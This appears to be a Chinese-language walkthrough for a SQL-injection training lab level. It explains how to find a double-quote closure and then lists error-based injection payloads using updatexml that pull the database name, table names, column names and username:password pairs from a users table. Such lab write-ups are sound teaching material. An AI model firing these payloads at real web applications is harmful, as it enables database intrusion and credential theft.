# 确认闭合类型
跟第四关的情景一样，使用单引号并不会报错  
当你使用双引号闭合输入?id=1"时就会进行报错  
那么就是进行双引号闭合

仍然有报错信息，这关还是可以使用报错注入，跟上题payload一样，单引号改双引号即可


# 查询数据库名
?id=1" and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+

# 查询表名
?id=1" and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+


# 查询列名
?id=1" and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),0x7e),1)--+


# 查询值
?id=1" and updatexml(1,concat(0x7e,substring((select group_concat(username,':',password) from users),1,10),0x7e),1)--+

?id=1" and updatexml(1,concat(0x7e,substring((select group_concat(username,':',password) from users),11,10),0x7e),1)--+

?id=1" and updatexml(1,concat(0x7e,substring((select group_concat(username,':',password) from users),21,10),0x7e),1)--+

...